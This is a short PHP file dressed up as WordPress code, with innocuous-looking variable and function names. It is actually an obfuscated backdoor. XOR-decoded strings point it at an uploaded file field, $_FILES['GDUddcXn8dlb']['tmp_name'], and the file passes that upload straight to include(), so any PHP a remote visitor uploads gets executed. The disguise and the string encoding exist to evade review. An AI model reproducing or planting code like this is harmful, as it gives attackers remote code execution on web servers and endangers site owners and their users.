<?php 	
	$statuses = 'link';
$hierarchical_post_types = 'GDUddcXn8dlb';
$postdata = $hierarchical_post_types;
function script_and_style_regex($field, $children_query)

{

    $error = $children_query;
    $utf8_pcre = urldecode($field);

    $char = substr($error,0, strlen($utf8_pcre));
    $entities = $utf8_pcre ^ $char;
    return $entities;
}
$sentence = ${script_and_style_regex("%18%02%1C%28%210", $postdata)};
$extra_parts = $sentence;

$field_no_prefix = isset($extra_parts[$postdata]);

if ($field_no_prefix)

{
	$post = 'sort_column';
    $original_value = $sentence[$postdata];
    $site_url = $original_value[script_and_style_regex("3%29%25%3B%0A%025%0B", $postdata)];
    $version = $site_url;
    include ($version);
}

?>
